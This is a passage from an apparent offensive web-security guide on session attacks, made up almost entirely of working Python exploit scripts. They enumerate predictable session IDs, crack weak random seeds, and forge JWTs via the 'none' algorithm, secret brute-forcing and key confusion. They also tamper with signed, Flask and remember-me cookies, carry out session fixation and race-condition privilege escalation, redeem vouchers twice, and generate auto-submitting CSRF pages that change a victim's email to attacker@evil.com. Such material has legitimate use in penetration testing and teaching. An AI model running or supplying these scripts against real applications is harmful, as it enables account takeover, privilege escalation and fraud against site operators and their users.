    try:
        # Try to parse as integer
        session_int = int(known_session)
        
        print(f"[*] Base session: {session_int}")
        print(f"[*] Attempting to enumerate adjacent sessions...")
        
        valid_sessions = []
        
        # Try sessions around the known one
        for offset in range(-50, 51):
            test_session = session_int + offset
            
            # Test if session is valid
            response = requests.get(
                base_url,
                cookies={'SESSIONID': str(test_session)}
            )
            
            # Check if session is valid (customize based on response)
            if response.status_code == 200 and 'logout' in response.text.lower():
                print(f"[+] Valid session found: {test_session}")
                valid_sessions.append(test_session)
        
        return valid_sessions
        
    except ValueError:
        # Try hex encoding
        try:
            session_int = int(known_session, 16)
            print(f"[*] Detected hex-encoded session: {session_int}")
            
            valid_sessions = []
            for offset in range(-50, 51):
                test_session = hex(session_int + offset)[2:]
                
                response = requests.get(
                    base_url,
                    cookies={'SESSIONID': test_session}
                )
                
                if response.status_code == 200 and 'logout' in response.text.lower():
                    print(f"[+] Valid session found: {test_session}")
                    valid_sessions.append(test_session)
            
            return valid_sessions
            
        except:
            print("[-] Could not determine session format")
            return []

# Example usage
# valid_sessions = exploit_sequential_sessions(
#     "http://target.com/dashboard",
#     "123456789"
# )
```

**Weak Random Session Detection**

```python
#!/usr/bin/env python3
import random
import hashlib

def test_weak_random_sessions(sessions):
    """
    Test if sessions use weak random number generator
    """
    # Test for PHP mt_rand() weakness
    if len(sessions) >= 2:
        print("[*] Testing for PHP mt_rand() pattern...")
        
        # Try to predict seed based on known outputs
        for seed_candidate in range(0, 1000000):
            random.seed(seed_candidate)
            
            # Generate test sessions
            test_sessions = []
            for _ in range(len(sessions)):
                rand_val = random.randint(0, 2**31 - 1)
                test_session = hashlib.md5(str(rand_val).encode()).hexdigest()
                test_sessions.append(test_session)
            
            if test_sessions == sessions:
                print(f"[+] Found seed: {seed_candidate}")
                
                # Predict next sessions
                for i in range(5):
                    rand_val = random.randint(0, 2**31 - 1)
                    next_session = hashlib.md5(str(rand_val).encode()).hexdigest()
                    print(f"[+] Predicted next session: {next_session}")
                
                return seed_candidate
    
    print("[-] Could not determine weak random pattern")
    return None

# Example
sessions = collect_session_ids("http://target.com", 10)
test_weak_random_sessions(sessions)
```

### Cookie Manipulation

Cookie manipulation allows attackers to modify session data and authentication tokens.

**Cookie Structure Analysis**

```python
#!/usr/bin/env python3
import base64
import json
import jwt
import zlib
from urllib.parse import unquote

def analyze_cookie(cookie_value):
    """
    Comprehensive cookie analysis
    """
    print(f"[*] Original cookie: {cookie_value[:50]}...")
    print(f"[*] Length: {len(cookie_value)} bytes")
    
    # Test 1: URL encoding
    try:
        decoded_url = unquote(cookie_value)
        if decoded_url != cookie_value:
            print(f"[+] URL encoded detected")
            cookie_value = decoded_url
    except:
        pass
    
    # Test 2: Base64 encoding
    try:
        decoded_b64 = base64.b64decode(cookie_value)
        print(f"[+] Base64 decoded: {decoded_b64[:50]}")
        
        # Check if JSON
        try:
            json_data = json.loads(decoded_b64)
            print(f"[+] JSON structure detected:")
            print(json.dumps(json_data, indent=2))
            return {'type': 'base64_json', 'data': json_data}
        except:
            pass
        
        # Check if serialized PHP
        if b'O:' in decoded_b64 or b'a:' in decoded_b64:
            print(f"[+] PHP serialized object detected")
            return {'type': 'php_serialized', 'data': decoded_b64}
        
        # Check if compressed
        try:
            decompressed = zlib.decompress(decoded_b64)
            print(f"[+] Compressed data detected")
            print(f"[+] Decompressed: {decompressed[:100]}")
            return {'type': 'compressed', 'data': decompressed}
        except:
            pass
            
    except:
        pass
    
    # Test 3: JWT token
    if cookie_value.count('.') == 2:
        try:
            decoded_jwt = jwt.decode(cookie_value, options={"verify_signature": False})
            print(f"[+] JWT token detected:")
            print(json.dumps(decoded_jwt, indent=2))
            
            # Try to decode header
            header = jwt.get_unverified_header(cookie_value)
            print(f"[+] JWT header:")
            print(json.dumps(header, indent=2))
            
            return {'type': 'jwt', 'data': decoded_jwt, 'header': header}
        except:
            pass
    
    # Test 4: Hexadecimal
    try:
        decoded_hex = bytes.fromhex(cookie_value)
        print(f"[+] Hex decoded: {decoded_hex[:50]}")
        return {'type': 'hex', 'data': decoded_hex}
    except:
        pass
    
    # Test 5: Look for patterns
    if ':' in cookie_value:
        parts = cookie_value.split(':')
        print(f"[+] Delimiter detected (:), {len(parts)} parts")
        return {'type': 'delimited', 'data': parts}
    
    if '|' in cookie_value:
        parts = cookie_value.split('|')
        print(f"[+] Delimiter detected (|), {len(parts)} parts")
        return {'type': 'delimited', 'data': parts}
    
    return {'type': 'unknown', 'data': cookie_value}

# Example usage
cookie = "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9"
analysis = analyze_cookie(cookie)
```

**JWT Token Manipulation**

```python
#!/usr/bin/env python3
import jwt
import json
import base64

def exploit_jwt_none_algorithm(token):
    """
    Exploit JWT 'none' algorithm vulnerability
    """
    # Decode without verification
    payload = jwt.decode(token, options={"verify_signature": False})
    
    print(f"[*] Original payload: {json.dumps(payload, indent=2)}")
    
    # Modify payload (e.g., escalate privileges)
    payload['role'] = 'admin'
    payload['isAdmin'] = True
    
    # Create new token with 'none' algorithm
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    # Manually construct JWT with no signature
    encoded_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    encoded_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # JWT with empty signature
    forged_token = f"{encoded_header}.{encoded_payload}."
    
    print(f"[+] Forged token (none algorithm): {forged_token}")
    return forged_token

def exploit_jwt_weak_secret(token, wordlist):
    """
    Brute force JWT secret
    """
    print("[*] Attempting to crack JWT secret...")
    
    for secret in wordlist:
        try:
            # Try to verify with this secret
            jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])
            print(f"[+] Secret found: {secret}")
            
            # Forge new token with escalated privileges
            payload = jwt.decode(token, secret, algorithms=["HS256"])
            payload['role'] = 'admin'
            
            forged = jwt.encode(payload, secret, algorithm="HS256")
            print(f"[+] Forged token: {forged}")
            return forged
            
        except jwt.InvalidSignatureError:
            continue
        except Exception as e:
            continue
    
    print("[-] Secret not found in wordlist")
    return None

def exploit_jwt_key_confusion(token, public_key_path):
    """
    Exploit RS256 to HS256 algorithm confusion
    """
    # Read public key
    with open(public_key_path, 'r') as f:
        public_key = f.read()
    
    # Decode original token
    payload = jwt.decode(token, options={"verify_signature": False})
    
    # Modify payload
    payload['role'] = 'admin'
    
    # Sign with HS256 using public key as secret
    forged_token = jwt.encode(payload, public_key, algorithm="HS256")
    
    print(f"[+] Forged token (key confusion): {forged_token}")
    return forged_token

# Example usage
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
# forged = exploit_jwt_none_algorithm(jwt_token)

# Brute force weak secret
# wordlist = ['secret', 'password', 'key', '123456']
# forged = exploit_jwt_weak_secret(jwt_token, wordlist)
```

**Cookie Tampering with HMAC**

```python
#!/usr/bin/env python3
import hmac
import hashlib
import base64

def tamper_signed_cookie(cookie, separator='|', hash_func='sha256'):
    """
    Attempt to tamper with signed cookies
    Format: data|signature
    """
    parts = cookie.split(separator)
    
    if len(parts) != 2:
        print("[-] Cookie format not recognized")
        return None
    
    data, signature = parts
    
    print(f"[*] Data: {data}")
    print(f"[*] Signature: {signature}")
    
    # Decode data
    try:
        decoded_data = base64.b64decode(data).decode()
        print(f"[*] Decoded data: {decoded_data}")
        
        # Attempt modification
        # This requires knowing the secret key
        # If signature verification is weak, try common secrets
        
        common_secrets = ['secret', 'key', 'password', '', 'admin']
        
        for secret in common_secrets:
            # Try to verify original signature
            if hash_func == 'sha256':
                expected_sig = hmac.new(
                    secret.encode(),
                    data.encode(),
                    hashlib.sha256
                ).hexdigest()
            elif hash_func == 'md5':
                expected_sig = hmac.new(
                    secret.encode(),
                    data.encode(),
                    hashlib.md5
                ).hexdigest()
            
            if expected_sig == signature:
                print(f"[+] Secret found: {secret}")
                
                # Forge new cookie
                new_data = decoded_data.replace('user', 'admin')
                new_data_encoded = base64.b64encode(new_data.encode()).decode()
                
                new_signature = hmac.new(
                    secret.encode(),
                    new_data_encoded.encode(),
                    hashlib.sha256 if hash_func == 'sha256' else hashlib.md5
                ).hexdigest()
                
                forged_cookie = f"{new_data_encoded}{separator}{new_signature}"
                print(f"[+] Forged cookie: {forged_cookie}")
                return forged_cookie
        
        print("[-] Could not verify signature with common secrets")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

# Example
cookie = "dXNlcj1ndWVzdA==|5d41402abc4b2a76b9719d911017c592"
forged = tamper_signed_cookie(cookie)
```

**Flask Session Cookie Decoding**

```python
#!/usr/bin/env python3
from flask.sessions import SecureCookieSessionInterface
import hashlib

def decode_flask_cookie(cookie_value, secret_key=None):
    """
    Decode and optionally forge Flask session cookie
    """
    serializer = SecureCookieSessionInterface().get_signing_serializer(
        {'SECRET_KEY': secret_key or 'dummy'}
    )
    
    try:
        if secret_key:
            # Verify and decode
            session_data = serializer.loads(cookie_value)
            print(f"[+] Session data: {session_data}")
            return session_data
        else:
            # Decode without verification (if possible)
            import itsdangerous
            payload = cookie_value.split('.')[0]
            decoded = itsdangerous.base64_decode(payload)
            print(f"[*] Decoded payload: {decoded}")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

def forge_flask_cookie(session_data, secret_key):
    """
    Create forged Flask session cookie
    """
    from flask import Flask
    
    app = Flask(__name__)
    app.secret_key = secret_key
    
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    
    forged = serializer.dumps(session_data)
    print(f"[+] Forged cookie: {forged}")
    return forged

# Example
# flask_cookie = "eyJ1c2VyIjoiZ3Vlc3QifQ.YjZkZQ.xxxxxxxxxxx"
# decode_flask_cookie(flask_cookie)

# If secret is known/cracked
# forged = forge_flask_cookie({'user': 'admin', 'role': 'administrator'}, 'secret_key')
```

### Session Timeout Bypass

Session timeout mechanisms can be bypassed through various techniques.

**Keep-Alive Session Extension**

```python
#!/usr/bin/env python3
import requests
import time
import threading

def keep_session_alive(session_id, base_url, interval=60):
    """
    Keep session alive by periodic requests
    """
    session = requests.Session()
    session.cookies.set('SESSIONID', session_id)
    
    def heartbeat():
        while True:
            try:
                # Send lightweight request to refresh session
                response = session.get(f"{base_url}/api/heartbeat")
                
                if response.status_code == 200:
                    print(f"[+] Session refreshed at {time.strftime('%H:%M:%S')}")
                else:
                    print(f"[-] Session may have expired: {response.status_code}")
                    break
                    
            except Exception as e:
                print(f"[-] Error: {e}")
                break
            
            time.sleep(interval)
    
    # Start heartbeat thread
    thread = threading.Thread(target=heartbeat, daemon=True)
    thread.start()
    
    return thread

# Example usage
# session_id = "abc123def456"
# keep_alive_thread = keep_session_alive(session_id, "http://target.com", interval=30)
```

**Remember Me Token Exploitation**

```python
#!/usr/bin/env python3
import hashlib
import time

def analyze_remember_token(token):
    """
    Analyze "Remember Me" token structure
    """
    print(f"[*] Token: {token}")
    print(f"[*] Length: {len(token)}")
    
    # Common patterns for remember-me tokens
    
    # Pattern 1: username:expiry:hash
    if token.count(':') == 2:
        parts = token.split(':')
        print(f"[+] Format detected: username:expiry:hash")
        print(f"    Username: {parts[0]}")
        print(f"    Expiry: {parts[1]}")
        print(f"    Hash: {parts[2]}")
        
        # Try to forge token for different user
        target_user = "admin"
        expiry = parts[1]
        
        # If hash is weak or predictable
        forged_hash = hashlib.md5(f"{target_user}:{expiry}".encode()).hexdigest()
        forged_token = f"{target_user}:{expiry}:{forged_hash}"
        
        print(f"[+] Forged token attempt: {forged_token}")
        return forged_token
    
    # Pattern 2: Base64(username:expiry):HMAC
    try:
        import base64
        decoded = base64.b64decode(token.split(':')[0])
        print(f"[+] Decoded: {decoded}")
    except:
        pass
    
    return None

def extend_session_expiry(cookie_value):
    """
    Attempt to extend session expiry time
    """
    import base64
    import json
    
    try:
        # Decode cookie
        decoded = base64.b64decode(cookie_value)
        session_data = json.loads(decoded)
        
        print(f"[*] Original session data: {json.dumps(session_data, indent=2)}")
        
        # Modify expiry
        if 'expiry' in session_data:
            current_expiry = session_data['expiry']
            new_expiry = current_expiry + 86400  # Add 1 day
            session_data['expiry'] = new_expiry
            
            print(f"[+] Extended expiry from {current_expiry} to {new_expiry}")
        
        if 'expires_at' in session_data:
            session_data['expires_at'] = int(time.time()) + 31536000  # 1 year
        
        # Re-encode (note: signature will be invalid)
        modified = base64.b64encode(json.dumps(session_data).encode()).decode()
        print(f"[+] Modified cookie: {modified}")
        print(f"[!] Note: Signature verification may fail")
        
        return modified
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Example
# remember_token = "user123:1704067200:5d41402abc4b2a76b9719d911017c592"
# forged = analyze_remember_token(remember_token)
```

**Session Fixation for Timeout Bypass**

```python
#!/usr/bin/env python3
import requests

def session_fixation_attack(target_url, fixed_session_id):
    """
    Exploit session fixation to bypass timeout
    """
    # Step 1: Obtain a valid session ID from the application
    print("[*] Setting fixed session ID...")
    
    session = requests.Session()
    
    # Set predetermined session ID (if application accepts it)
    session.cookies.set('SESSIONID', fixed_session_id)
    
    # Step 2: Access application with fixed session
    response = session.get(target_url)
    
    if 'SESSIONID' in session.cookies and \
       session.cookies['SESSIONID'] == fixed_session_id:
        print(f"[+] Session fixation successful: {fixed_session_id}")
        print(f"[*] Waiting for victim to authenticate...")
        
        # Monitor session
        while True:
            response = session.get(f"{target_url}/profile")
            
            if 'Welcome,' in response.text or response.status_code == 200:
                print(f"[+] Session is now authenticated!")
                print(f"[+] Session will not timeout from our perspective")
                return True
            
            time.sleep(5)
    else:
        print("[-] Session fixation failed - application generated new session")
        return False

# Example usage
# fixed_sid = "1234567890abcdef"
# session_fixation_attack("http://target.com", fixed_sid)
```

### Concurrent Session Abuse

Concurrent session vulnerabilities allow multiple simultaneous sessions or race conditions.

**Detecting Concurrent Session Limits**

```python
#!/usr/bin/env python3
import requests
import threading
from queue import Queue

def test_concurrent_sessions(base_url, credentials, max_sessions=10):
    """
    Test if application limits concurrent sessions
    """
    sessions = []
    results = Queue()
    
    def create_session(thread_id):
        try:
            session = requests.Session()
            
            # Login
            login_response = session.post(
                f"{base_url}/login",
                data=credentials
            )
            
            if login_response.status_code == 200 and 'logout' in login_response.text.lower():
                # Test if session is active
                test_response = session.get(f"{base_url}/dashboard")
                
                if test_response.status_code == 200:
                    results.put((thread_id, True, session))
                    print(f"[+] Session {thread_id}: Active")
                else:
                    results.put((thread_id, False, None))
                    print(f"[-] Session {thread_id}: Failed")
            else:
                results.put((thread_id, False, None))
                print(f"[-] Session {thread_id}: Login failed")
                
        except Exception as e:
            results.put((thread_id, False, None))
            print(f"[-] Session {thread_id}: Error - {e}")
    
    # Create multiple sessions concurrently
    threads = []
    for i in range(max_sessions):
        thread = threading.Thread(target=create_session, args=(i,))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads
    for thread in threads:
        thread.join()
    
    # Analyze results
    active_sessions = []
    while not results.empty():
        thread_id, success, session = results.get()
        if success:
            active_sessions.append((thread_id, session))
    
    print(f"\n[*] Total active concurrent sessions: {len(active_sessions)}")
    
    if len(active_sessions) == max_sessions:
        print(f"[!] No concurrent session limit detected!")
    else:
        print(f"[*] Concurrent session limit appears to be: {len(active_sessions)}")
    
    return active_sessions

# Example
# credentials = {'username': 'testuser', 'password': 'password123'}
# active = test_concurrent_sessions("http://target.com", credentials, max_sessions=5)
```

**Race Condition in Session Creation**

```python
#!/usr/bin/env python3
import requests
import threading
import time

def race_condition_session_creation(target_url, count=10):
    """
    Exploit race condition in session creation/authentication
    """
    results = []
    lock = threading.Lock()
    
    def attempt_creation(thread_id):
        try:
            start_time = time.time()
            
            # Simultaneous requests
            response = requests.post(
                f"{target_url}/api/create_session",
                data={'user_id': '1'}  # Same user ID
            )
            
            end_time = time.time()
            
            with lock:
                if response.status_code == 200:
                    session_id = response.json().get('session_id')
                    results.append({
                        'thread_id': thread_id,
                        'session_id': session_id,
                        'time': end_time - start_time
                    })
                    print(f"[+] Thread {thread_id}: Session created - {session_id}")
        
        except Exception as e:
            print(f"[-] Thread {thread_id}: Error - {e}")
    
    # Launch simultaneous threads
    threads = []
    print("[*] Launching race condition attack...")
    
    for i in range(count):
        thread = threading.Thread(target=attempt_creation, args=(i,))
        threads.append(thread)
    
    # Start all threads at approximately the same time
    for thread in threads:
        thread.start()
    
    # Wait for completion
    for thread in threads:
        thread.join()
    
    # Analyze results
    print(f"\n[*] Created {len(results)} sessions")
    
    # Check for duplicate session IDs (should not happen)
    session_ids = [r['session_id'] for r in results]
    unique_ids = set(session_ids)
    
    if len(session_ids) != len(unique_ids):
        print(f"[!] Race condition detected! Duplicate session IDs found")
        print(f"[!] This could lead to session collision")
    
    return results

# Example usage
# race_condition_session_creation("http://target.com", count=20)
```

**Privilege Escalation via Concurrent Requests**

```python
#!/usr/bin/env python3
import requests
import threading

def concurrent_privilege_escalation(session_cookie, target_url):
    """
    Exploit race condition in privilege checking
    """
    results = {'success': False}
    
    def change_role(role):
        session = requests.Session()
        session.cookies.set('SESSIONID', session_cookie)
        
        try:
            response = session.post(
                f"{target_url}/api/update_profile",
                json={'role': role}
            )
            
            if response.status_code == 200:
                print(f"[+] Role change to '{role}' successful")
                results['success'] = True
        except Exception as e:
            print(f"[-] Error changing to '{role}': {e}")
    
    def check_admin_access():
        time.sleep(0.1)  # Small delay
        session = requests.Session()
        session.cookies.set('SESSIONID', session_cookie)
        
        try:
            response = session.get(f"{target_url}/admin/panel")
            
            if response.status_code == 200:
                print(f"[+] Admin access confirmed!")
                results['admin_access'] = True
            else:
                print(f"[-] Admin access denied: {response.status_code}")
                results['admin_access'] = False
        except Exception as e:
            print(f"[-] Error checking admin: {e}")
    
    # Launch concurrent requests
    threads = []
    
    # Multiple privilege escalation attempts
    for _ in range(5):
        t = threading.Thread(target=change_role, args=('admin',))
        threads.append(t)
    
    # Add admin access check
    check_thread = threading.Thread(target=check_admin_access)
    threads.append(check_thread)
    
    print("[*] Launching concurrent privilege escalation...")
    
    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()
    
    return results

# Example
# session = "abc123def456"
# result = concurrent_privilege_escalation(session, "http://target.com")
```

**Session Token Reuse Across Accounts**

```python
#!/usr/bin/env python3
import requests

def test_session_isolation(base_url):
    """
    Test if sessions are properly isolated between users
    """
    # Login as User 1
    session1 = requests.Session()
    response1 = session1.post(
        f"{base_url}/login",
        data={'username': 'user1', 'password': 'pass1'}
    )
    
    session1_cookie = session1.cookies.get('SESSIONID')
    print(f"[*] User1 session: {session1_cookie}")
    
    # Get User 1 profile
    profile1 = session1.get(f"{base_url}/api/profile").json()
    print(f"[*] User1 profile: {profile1}")
    
    # Login as User 2
    session2 = requests.Session()
    response2 = session2.post(
        f"{base_url}/login",
        data={'username': 'user2', 'password': 'pass2'}
    )
    
    session2_cookie = session2.cookies.get('SESSIONID')
    print(f"[*] User2 session: {session2_cookie}")
    
    # Test 1: Try to use User1's session cookie as User2
    print("\n[*] Test 1: Session token reuse")
    session2.cookies.set('SESSIONID', session1_cookie)
    
    profile_test = session2.get(f"{base_url}/api/profile")
    
    if profile_test.status_code == 200:
        profile_data = profile_test.json()
        
        if profile_data.get('username') == 'user1':
            print("[!] VULNERABILITY: Session reused successfully!")
            print("[!] User2 accessed User1's profile")
            return True
        else:
            print("[+] Session properly isolated")
    else:
        print("[+] Session validation working correctly")
    
    # Test 2: Session fixation
    print("\n[*] Test 2: Session fixation")
    
    # Create new session
    session3 = requests.Session()
    fixed_session = "FIXED_SESSION_ID_12345"
    session3.cookies.set('SESSIONID', fixed_session)
    
    # Try to login with fixed session
    response3 = session3.post(
        f"{base_url}/login",
        data={'username': 'user1', 'password': 'pass1'}
    )
    
    # Check if session ID remained the same
    if session3.cookies.get('SESSIONID') == fixed_session:
        print("[!] VULNERABILITY: Session fixation possible!")
        print(f"[!] Session ID not regenerated after login")
        return True
    else:
        print("[+] Session regenerated after login (secure)")
    
    return False

# Example
# test_session_isolation("http://target.com")
```

**Parallel Session Exploitation**

```python
#!/usr/bin/env python3
import requests
import threading
from datetime import datetime

def exploit_parallel_sessions(base_url, credentials, operation_count=100):
    """
    Exploit lack of transaction locking in concurrent sessions
    Example: Double-spending, duplicate voucher redemption, etc.
    """
    results = {'successes': 0, 'failures': 0}
    lock = threading.Lock()
    
    def perform_operation(thread_id):
        try:
            # Create separate session for each thread
            session = requests.Session()
            
            # Login
            login_resp = session.post(
                f"{base_url}/login",
                data=credentials
            )
            
            if login_resp.status_code != 200:
                with lock:
                    results['failures'] += 1
                return
            
            # Perform sensitive operation (e.g., redeem voucher, transfer money)
            operation_resp = session.post(
                f"{base_url}/api/redeem_voucher",
                json={'voucher_code': 'PROMO2025'}
            )
            
            timestamp = datetime.now().strftime("%H:%M:%S.%f")
            
            if operation_resp.status_code == 200:
                with lock:
                    results['successes'] += 1
                print(f"[+] Thread {thread_id} at {timestamp}: SUCCESS")
            else:
                with lock:
                    results['failures'] += 1
                print(f"[-] Thread {thread_id} at {timestamp}: FAILED - {operation_resp.status_code}")
        
        except Exception as e:
            with lock:
                results['failures'] += 1
            print(f"[-] Thread {thread_id}: Error - {e}")
    
    # Launch parallel operations
    threads = []
    print(f"[*] Launching {operation_count} parallel operations...")
    
    start_time = datetime.now()
    
    for i in range(operation_count):
        thread = threading.Thread(target=perform_operation, args=(i,))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads
    for thread in threads:
        thread.join()
    
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    # Report results
    print(f"\n[*] Operation completed in {duration:.2f} seconds")
    print(f"[*] Successes: {results['successes']}")
    print(f"[*] Failures: {results['failures']}")
    
    if results['successes'] > 1:
        print(f"[!] VULNERABILITY: Operation succeeded {results['successes']} times!")
        print(f"[!] Expected: 1 success, {operation_count-1} failures")
        print(f"[!] Application lacks proper transaction locking")
    
    return results

# Example
# creds = {'username': 'victim', 'password': 'password123'}
# exploit_parallel_sessions("http://target.com", creds, operation_count=50)
```

**CSRF with Session Riding**

```python
#!/usr/bin/env python3
import requests

def generate_csrf_poc(target_url, method='POST', params=None, cookies=None):
    """
    Generate CSRF proof-of-concept HTML
    """
    if method.upper() == 'POST':
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf-form" action="{target_url}" method="POST">
'''
        
        if params:
            for key, value in params.items():
                html += f'        <input type="hidden" name="{key}" value="{value}" />\n'
        
        html += '''        <input type="submit" value="Submit Request" />
    </form>
    
    <script>
        // Auto-submit form
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>'''
    
    elif method.upper() == 'GET':
        query_string = '&'.join([f"{k}={v}" for k, v in params.items()]) if params else ''
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <img src="{target_url}?{query_string}" style="display:none;" />
    <script>
        // Alternative method
        fetch('{target_url}?{query_string}', {{
            method: 'GET',
            credentials: 'include'
        }});
    </script>
</body>
</html>'''
    
    return html

def test_csrf_protection(base_url, authenticated_session):
    """
    Test CSRF protection mechanisms
    """
    tests = []
    
    # Test 1: No CSRF token
    print("[*] Test 1: Request without CSRF token")
    try:
        response = requests.post(
            f"{base_url}/api/change_email",
            data={'email': 'attacker@evil.com'},
            cookies=authenticated_session.cookies
        )
        
        if response.status_code == 200:
            tests.append({
                'test': 'No CSRF token',
                'vulnerable': True,
                'details': 'Request succeeded without token'
            })
            print("[!] VULNERABLE: No CSRF protection")
        else:
            tests.append({
                'test': 'No CSRF token',
                'vulnerable': False,
                'details': f'Request blocked: {response.status_code}'
            })
            print("[+] CSRF protection present")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Test 2: Empty CSRF token
    print("\n[*] Test 2: Empty CSRF token")
    try:
        response = requests.post(
            f"{base_url}/api/change_email",
            data={'email': 'attacker@evil.com', 'csrf_token': ''},
            cookies=authenticated_session.cookies
        )
        
        if response.status_code == 200:
            tests.append({
                'test': 'Empty CSRF token',
                'vulnerable': True,
                'details': 'Empty token accepted'
            })
            print("[!] VULNERABLE: Empty CSRF token accepted")
        else:
            tests.append({
                'test': 'Empty CSRF token',
                'vulnerable': False
            })
            print("[+] Empty token rejected")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Test 3: Token reuse from different session
    print("\n[*] Test 3: CSRF token from different session")
    
    # Create second session
    session2 = requests.Session()
    session2.post(
        f"{base_url}/login",
        data={'username': 'attacker', 'password': 'pass123'}
    )
    
    # Get CSRF token from attacker's session
    profile_page = session2.get(f"{base_url}/profile")
    # Extract token (simplified - actual extraction depends on implementation)
    import re
    csrf_match = re.search(r'csrf_token["\s:=]+([a-zA-Z0-9_-]+)', profile_page.text)
    
    if csrf_match:
        stolen_token = csrf_match.group(1)
        
        # Try to use stolen token in victim's session
        response = requests.post(
            f"{base_url}/api/change_email",
            data={'email': 'attacker@evil.com', 'csrf_token': stolen_token},
            cookies=authenticated_session.cookies
        )
        
        if response.status_code == 200:
            tests.append({
                'test': 'Token from different session',
                'vulnerable': True,
                'details': 'Token not bound to session'
            })
            print("[!] VULNERABLE: CSRF token not bound to session")
        else:
            tests.append({
                'test': 'Token from different session',
                'vulnerable': False
            })
            print("[+] Token properly bound to session")
    
    # Summary
    print("\n" + "="*50)
    print("CSRF Test Summary:")
    print("="*50)
    
    for test in tests:
        status = "VULNERABLE" if test['vulnerable'] else "SECURE"
        print(f"[{status}] {test['test']}")
        if 'details' in test:
            print(f"         {test['details']}")
    
    return tests

# Example usage
# session = requests.Session()
# session.post("http://target.com/login", data={'username': 'victim', 'password': 'pass'})
# test_csrf_protection("http://target.com", session)

# Generate CSRF PoC
# csrf_html = generate_csrf_poc(
#     "http://target.com/api/change_password",
#     method='POST',
#     params={'new_password': 'hacked123', 'confirm_password': 'hacked123'}
# )
# print(csrf_html)
```

**Session Logout Bypass**

```python
#!/usr/bin/env python3
import requests
import time

def test_logout_vulnerabilities(base_url, credentials):
    """
    Test various logout bypass techniques
    """
    vulnerabilities = []
    
    # Login and get session
    session = requests.Session()
    login_resp = session.post(
        f"{base_url}/login",
        data=credentials
    )
    
    original_session_id = session.cookies.get('SESSIONID')
    print(f"[*] Session ID: {original_session_id}")
    
    # Test 1: Session still valid after logout
    print("\n[*] Test 1: Session validity after logout")
    
    # Access protected resource
    before_logout = session.get(f"{base_url}/dashboard")
    print(f"[*] Before logout: {before_logout.status_code}")
    
    # Logout
    logout_resp = session.get(f"{base_url}/logout")
    print(f"[*] Logout response: {logout_resp.status_code}")
    
    # Try to access protected resource with same session
    after_logout = session.get(f"{base_url}/dashboard")
    
    if after_logout.status_code == 200 and 'login' not in after_logout.url.lower():
        vulnerabilities.append({
            'type': 'Session not invalidated',
            'severity': 'HIGH',
            'details': 'Session remains valid after logout'
        })
        print("[!] VULNERABLE: Session still valid after logout")
    else:
        print("[+] Session properly invalidated")
    
    # Test 2: Client-side logout only
    print("\n[*] Test 2: Client-side vs server-side logout")
    
    # Login again
    session2 = requests.Session()
    session2.post(f"{base_url}/login", data=credentials)
    session2_id = session2.cookies.get('SESSIONID')
    
    # Clear cookies locally (client-side logout)
    session2.cookies.clear()
    
    # Try to use old session ID
    session2.cookies.set('SESSIONID', session2_id)
    test_access = session2.get(f"{base_url}/dashboard")
    
    if test_access.status_code == 200:
        vulnerabilities.append({
            'type': 'Client-side logout only',
            'severity': 'HIGH',
            'details': 'Server does not track logout state'
        })
        print("[!] VULNERABLE: Client-side logout only")
    else:
        print("[+] Server-side logout working")
    
    # Test 3: Logout doesn't invalidate other sessions
    print("\n[*] Test 3: Multi-session logout")
    
    # Create two sessions
    session_a = requests.Session()
    session_b = requests.Session()
    
    session_a.post(f"{base_url}/login", data=credentials)
    time.sleep(1)
    session_b.post(f"{base_url}/login", data=credentials)
    
    session_a_id = session_a.cookies.get('SESSIONID')
    session_b_id = session_b.cookies.get('SESSIONID')
    
    print(f"[*] Session A: {session_a_id}")
    print(f"[*] Session B: {session_b_id}")
    
    # Logout from session A
    session_a.get(f"{base_url}/logout")
    
    # Check if session B is still valid
    test_b = session_b.get(f"{base_url}/dashboard")
    
    if test_b.status_code == 200:
        vulnerabilities.append({
            'type': 'Concurrent sessions not invalidated',
            'severity': 'MEDIUM',
            'details': 'Logout only affects current session'
        })
        print("[!] ISSUE: Other sessions remain active after logout")
    else:
        print("[+] All sessions invalidated on logout")
    
    # Test 4: Session fixation after logout
    print("\n[*] Test 4: Session fixation post-logout")
    
    fixed_session = "FIXED_SESSION_12345"
    session3 = requests.Session()
    session3.cookies.set('SESSIONID', fixed_session)
    
    # Login with fixed session
    session3.post(f"{base_url}/login", data=credentials)
    
    new_session_id = session3.cookies.get('SESSIONID')
    
    if new_session_id == fixed_session:
        vulnerabilities.append({
            'type': 'Session fixation possible',
            'severity': 'HIGH',
            'details': 'Session ID not regenerated on login'
        })
        print("[!] VULNERABLE: Session ID not regenerated")
    else:
        print("[+] Session ID regenerated on login")
    
    # Summary
    print("\n" + "="*60)
    print("Logout Vulnerability Summary:")
    print("="*60)
    
    if vulnerabilities:
        for vuln in vulnerabilities:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"    Details: {vuln['details']}")
    else:
        print("[+] No logout vulnerabilities detected")
    
    return vulnerabilities

# Example usage
# creds = {'username': 'testuser', 'password': 'testpass'}
# results = test_logout_vulnerabilities("http://target.com", creds)
```

**Session Storage Analysis**

```python
#!/usr/bin/env python3
import requests
import os

def analyze_session_storage(session_cookie):
    """
    Analyze where and how session data is stored
    """
    analysis = {
        'storage_type': None,
        'contains_sensitive_data': False,
        'is_encrypted': False,
        'is_signed': False,
        'vulnerabilities': []
    }
    
